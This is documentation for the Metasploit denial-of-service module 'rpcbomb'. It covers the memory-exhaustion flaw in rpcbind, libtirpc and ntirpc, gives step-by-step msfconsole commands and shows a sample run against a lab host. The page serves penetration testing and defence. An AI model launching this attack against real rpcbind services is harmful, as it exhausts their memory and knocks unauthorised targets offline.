## Vulnerable Application

This module [exploits a vulnerability](http://openwall.com/lists/oss-security/2017/05/03/12) in rpcbind through 0.2.4,
LIBTIRPC through 1.0.1 and 1.0.2-rc through 1.0.2-rc3, and NTIRPC through 1.4.3.

Exploiting this vulnerability allows an attacker to trigger large (and never freed) memory allocations for XDR strings on the target.

## Verification Steps

1. Start msfconsole
1. Do: `use auxiliary/dos/rpc/rpcbomb`
1. Do: `set RHOSTS [IP]`
1. Do: `run`
1. Target should leak memory

## Scenarios

### rpcbind 0.2.3-0.2 on Ubuntu 16.04 (amd64)

```
msf > use auxiliary/dos/rpc/rpcbomb 
msf auxiliary(rpcbomb) > set RHOSTS 10.0.2.7
RHOSTS => 10.0.2.7
msf auxiliary(rpcbomb) > run

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(rpcbomb) >
```
